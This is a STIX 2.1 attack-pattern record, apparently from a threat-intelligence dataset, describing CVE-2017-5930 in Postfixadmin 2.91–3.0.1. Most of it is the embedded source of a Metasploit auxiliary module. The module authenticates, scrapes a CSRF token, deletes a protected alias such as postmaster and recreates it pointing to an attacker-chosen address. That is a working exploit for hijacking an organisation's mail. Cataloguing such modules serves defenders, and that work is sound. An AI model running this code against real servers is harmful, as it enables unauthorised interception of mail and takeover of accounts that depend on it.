{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6352a9f8-74da-4e34-b094-0340f84f13e3",
    "created": "2024-08-14T16:23:49.913679Z",
    "modified": "2024-08-14T16:23:49.913683Z",
    "name": "Postfixadmin Protected Alias Deletion Vulnerability",
    "description": " Postfixadmin installations between 2.91 and 3.0.1 do not check if an admin is allowed to delete protected aliases. This vulnerability can be used to redirect protected aliases to an other mail address. Eg. rewrite the postmaster@domain alias ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/pfadmin_set_protected_alias.rb",
            "external_id": "pfadmin_set_protected_alias.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-5930"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/postfixadmin/postfixadmin/pull/23"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Postfixadmin Protected Alias Deletion Vulnerability',\n        'Description' => %q{\n          Postfixadmin installations between 2.91 and 3.0.1 do not check if an\n          admin is allowed to delete protected aliases. This vulnerability can be\n          used to redirect protected aliases to an other mail address. Eg. rewrite\n          the postmaster@domain alias\n        },\n        'Author' => [ 'Jan-Frederik Rieckers' ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2017-5930'],\n          ['URL', 'https://github.com/postfixadmin/postfixadmin/pull/23'],\n          ['BID', '96142'],\n        ],\n        'Privileged' => true,\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'DisclosureDate' => '2017-02-03'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to the postfixadmin installation', '/']),\n        OptString.new('USERNAME', [true, 'The Postfixadmin username to authenticate with']),\n        OptString.new('PASSWORD', [true, 'The Postfixadmin password to authenticate with']),\n        OptString.new('TARGET_ALIAS', [true, 'The alias which should be rewritten']),\n        OptString.new('NEW_GOTO', [true, 'The new redirection target of the alias'])\n      ]\n    )\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def target_alias\n    datastore['TARGET_ALIAS']\n  end\n\n  def new_goto\n    datastore['NEW_GOTO']\n  end\n\n  def check\n    res = send_request_cgi({ 'uri' => postfixadmin_url_login, 'method' => 'GET' })\n\n    return Exploit::CheckCode::Unknown unless res\n\n    return Exploit::CheckCode::Safe if res.code != 200\n\n    if res.body =~ /<div id=\"footer\".*Postfix Admin/m\n      version = res.body.match(%r{<div id=\"footer\"[^<]*<a[^<]*Postfix\\s*Admin\\s*([^<]*)</}mi)\n      return Exploit::CheckCode::Detected unless version\n      if Rex::Version.new('2.91') > Rex::Version.new(version[1])\n        return Exploit::CheckCode::Detected\n      elsif Rex::Version.new('3.0.1') < Rex::Version.new(version[1])\n        return Exploit::CheckCode::Detected\n      end\n\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Unknown\n  end\n\n  def run\n    print_status(\"Authenticating with Postfixadmin using #{username}:#{password} ...\")\n    cookie = postfixadmin_login(username, password)\n    fail_with(Failure::NoAccess, 'Failed to authenticate with PostfixAdmin') if cookie.nil?\n    print_good('Authenticated with Postfixadmin')\n\n    vprint_status('Requesting virtual_list')\n    res = send_request_cgi({ 'uri' => postfixadmin_url_list(target_alias.split('@')[-1]), 'method' => 'GET', 'cookie' => cookie }, 10)\n    fail_with(Failure::UnexpectedReply, 'The request for the domain list failed') if res.nil?\n    fail_with(Failure::NoAccess, 'Doesn\\'t seem to be admin for the domain the target alias is in') if res.redirect?\n    body = res.body\n    vprint_status('Get token')\n    token = body.match(/token=([0-9a-f]{32})/)\n    fail_with(Failure::UnexpectedReply, 'Could not get any CSRF-token. You should have at least one other alias or mailbox to get a token') unless token\n\n    t = token[1]\n\n    print_status('Delete the old alias')\n    res = send_request_cgi({ 'uri' => postfixadmin_url_alias_delete(target_alias, t), 'method' => 'GET', 'cookie' => cookie }, 10)\n\n    fail_with(Failure::UnexpectedReply, 'Didn\\'t get redirected.') unless res && res.redirect?\n\n    res = send_request_cgi({ 'uri' => postfixadmin_url_list, 'method' => 'GET', 'cookie' => cookie }, 10)\n\n    if res.nil? || res.body.nil? || res.body !~ %r{<ul class=\"flash-info\">.*<li.*#{target_alias}.*</li>.*</ul>}mi\n      if res.nil? || res.body.nil?\n        fail_with(Failure::UnexpectedReply, 'Unexpected reply while deleting the alias')\n      elsif res.body =~ %r{<ul class=\"flash-error\">.*<li.*#{target_alias}.*</li>.*</ul>}mi\n        fail_with(Failure::NotVulnerable, 'It seems the target is not vulerable, the deletion of the target alias failed.')\n      else\n        fail_with(Failure::Unknown, 'An unexpected failure occured.')\n      end\n    end\n    print_good('Deleted the old alias')\n\n    vprint_status('Will create the new alias')\n    post_vars = { 'submit' => 'Add alias', 'table' => 'alias', 'value[active]' => 1, 'value[domain]' => target_alias.split('@')[-1], 'value[localpart]' => target_alias.split('@')[0..-2].join('@'), 'value[goto]' => new_goto }\n\n    res = send_request_cgi({ 'uri' => postfixadmin_url_edit, 'method' => 'POST', 'cookie' => cookie, 'vars_post' => post_vars }, 10)\n\n    fail_with(Failure::UnexpectedReply, 'Didn\\'t get redirected.') unless res && res.redirect?\n\n    res = send_request_cgi({ 'uri' => postfixadmin_url_list, 'method' => 'GET', 'cookie' => cookie }, 10)\n\n    if res.nil? || res.body.nil? || res.body !~ %r{<ul class=\"flash-info\">.*<li.*#{target_alias}.*</li>.*</ul>}mi\n      if res.nil? || res.body.nil?\n        fail_with(Failure::UnexpectedReply, 'Unexpected reply while adding new alias')\n      elsif res.body =~ /<ul class=\"flash-error\">/mi\n        fail_with(Failure::UnexpectedReply, 'It seems the new alias couldn\\'t be added.')\n      else\n        fail_with(Failure::Unknown, 'An unexpected failure occured.')\n      end\n    end\n    print_good('New alias created')\n  end\n\n  # Performs a Postfixadmin login\n  #\n  # @param user [String] Username\n  # @param pass [String] Password\n  # @param timeout [Integer] Max seconds to wait before timeout, defaults to 20\n  #\n  # @return [String, nil] The session cookie as single string if login was successful, nil otherwise\n  def postfixadmin_login(user, pass, timeout = 20)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => postfixadmin_url_login,\n      'vars_post' => { 'fUsername' => user.to_s, 'fPassword' => pass.to_s, 'lang' => 'en', 'Submit' => 'Login' }\n    }, timeout)\n    if res && res.redirect?\n      cookies = res.get_cookies\n      return cookies if\n        cookies =~ /PHPSESSID=/\n    end\n\n    nil\n  end\n\n  def postfixadmin_url_login\n    normalize_uri(target_uri.path, 'login.php')\n  end\n\n  def postfixadmin_url_list(domain = nil)\n    modifier = domain.nil? ? '' : \"?domain=#{domain}\"\n    normalize_uri(target_uri.path, 'list-virtual.php' + modifier)\n  end\n\n  def postfixadmin_url_alias_delete(target, token)\n    normalize_uri(target_uri.path, 'delete.php' + \"?table=alias&delete=#{CGI.escape(target)}&token=#{token}\")\n  end\n\n  def postfixadmin_url_edit\n    normalize_uri(target_uri.path, 'edit.php')\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-02-03",
    "x_mitre_platforms": [
        "['php']"
    ]
}